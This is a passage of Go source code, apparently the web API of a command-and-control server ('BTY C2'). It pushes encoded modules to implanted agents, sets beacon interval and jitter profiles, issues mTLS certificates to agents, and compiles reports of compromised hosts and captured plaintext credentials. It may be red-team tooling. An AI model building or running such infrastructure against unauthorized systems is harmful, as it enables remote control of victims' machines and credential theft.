	mux.HandleFunc("/api/modules", cors(authMiddleware(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "GET" {
			modules := s.moduleStore.List()
			json.NewEncoder(w).Encode(modules)
			return
		}
		if r.Method == "POST" {
			var m module.Manifest
			if err := json.NewDecoder(r.Body).Decode(&m); err != nil {
				http.Error(w, "invalid JSON: "+err.Error(), 400)
				return
			}
			if err := s.moduleStore.Register(&m); err != nil {
				http.Error(w, err.Error(), 500)
				return
			}
			json.NewEncoder(w).Encode(map[string]string{"status": "registered", "name": m.Name})
			return
		}
	})))))

	// Push module to agent
	mux.HandleFunc("/api/modules/push", cors(authMiddleware(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		var req struct {
			ModuleName string `json:"module"`
			AgentID    string `json:"agent_id"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "invalid JSON", 400)
			return
		}

		packed, err := s.moduleStore.Pack(req.ModuleName)
		if err != nil {
			json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
			return
		}

		target := req.AgentID
		if target == "" {
			s.sessions.Range(func(k, v interface{}) bool {
				sess := v.(*session.Session)
				if sess.IsActive() {
					target = sess.ID
					return false
				}
				return true
			})
		}
		if target == "" {
			json.NewEncoder(w).Encode(map[string]string{"error": "no active agents — connect an agent first"})
			return
		}

		data, _ := json.Marshal(packed)
		cmd := fmt.Sprintf("module_load:%s", base64.StdEncoding.EncodeToString(data))

		result, err := s.CreateTask(target, cmd, 30)
		if err != nil {
			json.NewEncoder(w).Encode(map[string]interface{}{"error": err.Error(), "status": "failed"})
			return
		}

		json.NewEncoder(w).Encode(map[string]interface{}{
			"status":  "pushed",
			"module":  req.ModuleName,
			"agent":   target,
			"success": result.Success,
			"output":  result.Output,
		})
		return
	})))))

	// Delete module
	mux.HandleFunc("/api/modules/", cors(authMiddleware(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "DELETE" {
			http.Error(w, "method not allowed", 405)
			return
		}
		name := r.URL.Path[len("/api/modules/"):]
		if err := s.moduleStore.Delete(name); err != nil {
			http.Error(w, err.Error(), 404)
			return
		}
		json.NewEncoder(w).Encode(map[string]string{"status": "deleted", "name": name})
	})))))

	// Operators management (admin only)
	mux.HandleFunc("/api/operators", cors(authMiddleware(adminOnly(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "GET" {
			operators, err := s.db.ListOperators()
			if err != nil {
				http.Error(w, err.Error(), 500)
				return
			}
			json.NewEncoder(w).Encode(operators)
			return
		}
		if r.Method == "POST" {
			var req struct {
				Username string `json:"username"`
				Password string `json:"password"`
				Role     string `json:"role"`
			}
			if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
				http.Error(w, "invalid JSON", 400)
				return
			}
			if req.Username == "" || req.Password == "" {
				http.Error(w, "username and password required", 400)
				return
			}
			if req.Role == "" {
				req.Role = "operator"
			}
			if err := s.db.CreateOperator(req.Username, req.Password, req.Role); err != nil {
				http.Error(w, err.Error(), 409)
				return
			}
			s.db.LogAction(0, "operator_create", req.Username)
			json.NewEncoder(w).Encode(map[string]string{"status": "created", "username": req.Username})
			return
		}
	}))))))

	mux.HandleFunc("/api/operators/", cors(authMiddleware(adminOnly(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "DELETE" {
			http.Error(w, "method not allowed", 405)
			return
		}
		id := r.URL.Path[len("/api/operators/"):]
		if err := s.db.DeleteOperator(id); err != nil {
			http.Error(w, err.Error(), 404)
			return
		}
		s.db.LogAction(0, "operator_delete", id)
		json.NewEncoder(w).Encode(map[string]string{"status": "deleted"})
	}))))))

	// --- Team collaboration ---

	mux.HandleFunc("/api/notes", cors(authMiddleware(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			var req struct {
				SessionID string `json:"session_id"`
				Content   string `json:"content"`
			}
			json.NewDecoder(r.Body).Decode(&req)
			if req.SessionID == "" || req.Content == "" {
				http.Error(w, "session_id and content required", 400)
				return
			}
			s.db.AddSessionNote(req.SessionID, 0, req.Content)
			json.NewEncoder(w).Encode(map[string]string{"status": "added"})
			return
		}
		sessionID := r.URL.Query().Get("session_id")
		if sessionID == "" {
			http.Error(w, "session_id required", 400)
			return
		}
		notes, err := s.db.GetSessionNotes(sessionID)
		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		json.NewEncoder(w).Encode(notes)
	})))))

	mux.HandleFunc("/api/lock", cors(authMiddleware(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		var req struct {
			SessionID string `json:"session_id"`
			Action    string `json:"action"` // lock or unlock
		}
		json.NewDecoder(r.Body).Decode(&req)
		if req.SessionID == "" {
			http.Error(w, "session_id required", 400)
			return
		}
		if req.Action == "lock" {
			s.db.LockSession(req.SessionID, 0)
			json.NewEncoder(w).Encode(map[string]string{"status": "locked"})
		} else {
			s.db.UnlockSession(req.SessionID)
			json.NewEncoder(w).Encode(map[string]string{"status": "unlocked"})
		}
	})))))

	// --- Agent profiles ---

	mux.HandleFunc("/api/profiles", cors(authMiddleware(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			var req struct {
				Name          string  `json:"name"`
				BeaconInterval int     `json:"beacon_interval"`
				Jitter        float64 `json:"jitter"`
				Transport     string  `json:"transport"`
			}
			json.NewDecoder(r.Body).Decode(&req)
			id := fmt.Sprintf("profile-%x", time.Now().UnixNano())
			if req.BeaconInterval == 0 {
				req.BeaconInterval = 5
			}
			if req.Jitter == 0 {
				req.Jitter = 0.3
			}
			if req.Transport == "" {
				req.Transport = "tls"
			}
			s.db.CreateAgentProfile(id, req.Name, req.BeaconInterval, req.Jitter, req.Transport)
			json.NewEncoder(w).Encode(map[string]string{"id": id, "status": "created"})
			return
		}
		profiles, err := s.db.ListAgentProfiles()
		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		json.NewEncoder(w).Encode(profiles)
	})))))

	// --- Reporting ---

	mux.HandleFunc("/api/report", cors(authMiddleware(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		format := r.URL.Query().Get("format")
		if format == "" {
			format = "text"
		}

		// Build report from database
		sessions, _ := s.db.ListAllSessions()
		creds, _ := s.db.ListCredentials()

		report := &reporting.EngagementReport{
			Title:     "BTY C2 Engagement Report",
			Operator:  "admin",
			StartDate: time.Now().Add(-24 * time.Hour),
			EndDate:   time.Now(),
			Summary: reporting.ReportSummary{
				TotalSessions:    len(sessions),
				ActiveSessions:   0,
				TotalCredentials: len(creds),
				UniqueOS:         make(map[string]int),
			},
		}

		for _, s := range sessions {
			report.Sessions = append(report.Sessions, reporting.SessionReport{
				ID:        s.ID,
				AgentID:   s.AgentID,
				Hostname:  s.Hostname,
				OS:        s.OS,
				Arch:      s.Arch,
				Username:  s.Username,
				IsAdmin:   s.IsAdmin,
				PublicIP:  s.PublicIP,
				FirstSeen: s.FirstSeen,
				LastSeen:  s.LastSeen,
				State:     s.State,
				TaskCount: s.TaskCount,
			})
			if s.State == "active" {
				report.Summary.ActiveSessions++
			}
			report.Summary.UniqueOS[s.OS]++
		}

		for _, c := range creds {
			report.Credentials = append(report.Credentials, reporting.CredentialReport{
				Username: c.Username,
				Password: c.Password,
				Domain:   c.Domain,
				Host:     c.Host,
				Service:  c.Service,
				Source:   c.Source,
				Captured: c.Captured,
			})
		}

		report.Summary.UniqueHosts = len(report.Summary.UniqueOS)

		var path string
		var err error
		if format == "csv" {
			path, err = s.reporter.GenerateCSV(report)
		} else {
			path, err = s.reporter.GenerateText(report)
		}

		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}

		json.NewEncoder(w).Encode(map[string]string{"path": path, "status": "generated"})
	})))))

	// --- SIEM webhooks ---

	mux.HandleFunc("/api/webhooks", cors(authMiddleware(adminOnly(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			var req struct {
				URL    string            `json:"url"`
				Events []string          `json:"events"`
			}
			json.NewDecoder(r.Body).Decode(&req)
			if req.URL == "" {
				http.Error(w, "url required", 400)
				return
			}
			s.siem.AddWebhook(siem.WebhookConfig{
				URL:    req.URL,
				Events: req.Events,
			})
			json.NewEncoder(w).Encode(map[string]string{"status": "added"})
			return
		}
		json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
	}))))))

	// --- mTLS certificate generation ---

	mux.HandleFunc("/api/mtls/cert", cors(authMiddleware(adminOnly(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "method not allowed", 405)
			return
		}

		if !s.mtlsEnabled {
			http.Error(w, `{"error":"mTLS not enabled"}`, 500)
			return
		}

		var req struct {
			AgentID string `json:"agent_id"`
		}
		json.NewDecoder(r.Body).Decode(&req)
		if req.AgentID == "" {
			req.AgentID = fmt.Sprintf("agent-%x", time.Now().UnixNano())
		}

		agentCert, err := crypto.GenerateAgentCert(s.caCert, s.caKey, req.AgentID)
		if err != nil {
			http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), 500)
			return
		}

		// Export CA cert for agent to verify server
		caPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: s.caCert.Raw})

		// Export agent cert and key
		agentCertPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: agentCert.Certificate[0]})
		var agentKeyPEM []byte
		if ecKey, ok := agentCert.PrivateKey.(*ecdsa.PrivateKey); ok {
			keyBytes, _ := x509.MarshalECPrivateKey(ecKey)
			agentKeyPEM = pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyBytes})
		}

		json.NewEncoder(w).Encode(map[string]interface{}{
			"agent_id":    req.AgentID,
			"cert_pem":    string(agentCertPEM),
			"key_pem":     string(agentKeyPEM),
			"ca_pem":      string(caPEM),
			"mtls_server": fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.Server.Port),
		})
	}))))))

	// Serve SPA frontend from web/dist/ if it exists
	distPath := s.findWebDist()
	if distPath != "" {
		fileServer := http.FileServer(http.Dir(distPath))
		mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			// Return 404 for unknown API paths
			if strings.HasPrefix(r.URL.Path, "/api/") {
				http.NotFound(w, r)
				return
			}
			path := filepath.Join(distPath, filepath.Clean(r.URL.Path))
			if _, err := os.Stat(path); err == nil {
				fileServer.ServeHTTP(w, r)
				return
			}
			http.ServeFile(w, r, filepath.Join(distPath, "index.html"))
		})
		log.Printf("[WEB] Serving SPA from %s", distPath)
	}

	return mux
}

func (s *Server) findWebDist() string {
	candidates := []string{
		"web/dist",
		"../../web/dist",
		"../../../web/dist",
	}
	for _, p := range candidates {
		if info, err := os.Stat(filepath.Join(p, "index.html")); err == nil && !info.IsDir() {
			abs, _ := filepath.Abs(p)
			return abs
		}
	}
	return ""
}

func generateTaskID() string {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("task-%x", time.Now().UnixNano())
	}
	return fmt.Sprintf("task-%x", b)
}

// peekConn wraps a net.Conn with pre-read bytes.
type peekConn struct {
	net.Conn
	peek []byte
	pos  int
}

func (c *peekConn) Read(b []byte) (int, error) {
	if c.pos < len(c.peek) {
		n := copy(b, c.peek[c.pos:])
		c.pos += n
		return n, nil
	}
	return c.Conn.Read(b)
}
